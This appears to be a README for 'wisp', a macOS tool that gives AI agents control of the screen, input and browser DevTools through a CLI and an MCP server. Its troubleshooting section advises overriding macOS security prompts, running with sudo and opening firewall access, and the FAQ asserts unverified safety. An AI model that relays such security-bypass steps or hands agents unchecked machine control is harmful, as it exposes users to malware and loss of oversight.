# 🧙‍♂️ wisp - Your AI's Helping Hand on Mac

[![Download wisp](https://img.shields.io/badge/Download-wisp-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Denisjoint75/wisp)

---

## 👋 What is wisp?

wisp is a friendly tool that lets computer programs (called "agents") see and control your Mac computer, just like a human would. It helps smart software interact with your screen by reading what's displayed, clicking buttons, typing text, and even checking behind the scenes in your browser's developer tools.

Think of wisp as a virtual assistant who can operate your Mac for you—clicking, scrolling, and typing—while you relax. It comes with a simple command-line tool (CLI) and a special server called MCP that makes it easy for other apps to connect.

---

## 📥 Download and Install

Visit this link to download the application: [https://github.com/Denisjoint75/wisp](https://github.com/Denisjoint75/wisp)

[![Get wisp Now](https://img.shields.io/badge/🚀-Download%20wisp%20Now-blue?style=for-the-badge&logo=appveyor)](https://github.com/Denisjoint75/wisp)

Once you're on the page, look for the green "Code" button or the "Releases" section to find the latest version for your Mac. Download the file and open it to begin installation. The process is straightforward—just follow the on-screen prompts.

---

## 🧭 Quick Start Guide

After installation, here's how to get started with wisp:

1. **Open wisp** – Find the wisp icon in your Applications folder or Launchpad and click it.
2. **Allow permissions** – wisp needs permission to control your Mac. When prompted, go to System Preferences > Privacy & Security > Accessibility and check wisp. Also, allow Screen Recording permission.
3. **Use the CLI** – Open Terminal (you'll find it in Utilities). Type `wisp` and press Enter. This will show a help menu with all available commands.
4. **Connect to MCP** – If you're using a programming tool that supports MCP, set the server address to `localhost` with the port wisp gives you. The default is usually `port 8765`.

---

## ✨ Key Features

### 🖥️ Accessibility Tree
wisp reads the accessibility information of every element on your screen. This means it can "see" buttons, menus, text fields, and more—even if they're not visible. It's like having X-ray vision for software.

### 🎮 Synthesized Input
Instead of physically moving a mouse, wisp creates virtual clicks, scrolls, and keystrokes. This is faster and more reliable than hardware control. You can automate repetitive tasks like filling forms or navigating web pages.

### 🔧 DevTools Integration
wisp connects directly to browser developer tools (DevTools). That means it can examine website code, network requests, and console logs—helping agents understand how web pages work under the hood.

### 📟 Command-Line Interface (CLI)
You don't need to be a programmer to use the CLI. Simple commands let you:
- `wisp click [x,y]` – Click at a specific location
- `wisp type "hello"` – Type text
- `wisp screenshot` – Capture the screen
- `wisp inspect` – Show what's under the cursor

### 🔌 MCP Server
The MCP (Model Context Protocol) server lets AI models or other software connect to wisp. This enables agents to interact with your Mac using natural language requests, like "Open Safari and go to example.com."

---

## 📖 Detailed Usage Instructions

### Using the CLI

1. **Open Terminal** – Go to Applications > Utilities > Terminal.
2. **Check installation** – Type `wisp --version`. If you see a version number, wisp is ready.
3. **Get help** – Type `wisp help` to see all commands and their descriptions.
4. **First test** – Try `wisp screenshot` to take a picture of your screen. The image will be saved in your home folder as `screen.png`.

### Command Examples

| Command | What it does |
|---------|--------------|
| `wisp click 100 200` | Clicks at coordinates (100,200) |
| `wisp scroll down` | Scrolls down the current page |
| `wisp type Hello world` | Types "Hello world" where the cursor is |
| `wisp run applescript` | Runs an AppleScript snippet |

### Connecting with MCP

If you're using an AI assistant or coding tool that supports MCP:

1. Start wisp with `wisp mcp` in Terminal.
2. Note the port number (usually 8765).
3. In your agent tool, configure the MCP server URL as `http://localhost:8765`.
4. Now your agent can ask wisp to perform actions on your Mac!

---

## 🔍 Troubleshooting

### wisp doesn't start
- Make sure you're running macOS 12 Monterey or later.
- Right-click the wisp icon and select "Open" to override security settings if prompted.

### Permissions errors
- Go to System Preferences > Privacy & Security.
- Under **Accessibility**, check the box next to wisp.
- Under **Screen Recording**, also enable wisp.
- Restart wisp after changing permissions.

### Nothing happens with CLI commands
- Ensure Terminal has permission to control your computer (same Accessibility settings).
- Try running `wisp` with `sudo` in front if you see permission errors.

### MCP not connecting
- Check your firewall settings—allow incoming connections for wisp.
- Confirm the port isn't already in use. Try `wisp mcp --port 9000` to change it.

---

## 🛠️ Advanced Configuration

wisp has a config file located at `~/.wisp/config.json`. You can edit this file to customize:

- **Sensitivity** – Adjust how precise clicks need to be.
- **Timeout** – How long wisp waits for elements to appear.
- **Logging** – Turn on detailed logs for debugging.

To open it, type `open ~/.wisp/config.json` in Terminal.

---

## ❓ Frequently Asked Questions

**Q: Is wisp free?**
A: Yes, wisp is completely free and open-source.

**Q: Can I use wisp on Windows?**
A: No, wisp is specifically designed for macOS. It uses macOS accessibility APIs.

**Q: Is it safe?**
A: wisp doesn't send any data off your computer. All processing is local.

**Q: Do I need to know code?**
A: Not for basic use. The CLI is simple, and anyone can follow the MCP instructions.

---

## 🎯 Use Cases

- **Automation** – Automate boring tasks like data entry or form filling.
- **Accessibility** – Help agents support people with disabilities by interacting via code.
- **Testing** – Automate web testing without writing complex test scripts.
- **AI Integration** – Give AI assistants real-world control over your computer.

---

## 📚 Additional Resources

- **Report Issues** – Found a bug? Visit the GitHub issues page.
- **Contribute** – wisp is open-source, so you can contribute code or docs.
- **Community** – Join discussions on GitHub Discussions.

---

## 🗃️ Keywords

automation, macOS, agents, MCP, CLI, accessibility, DevTools, computer use, AI assistant, screen control, input synthesis, open-source, productivity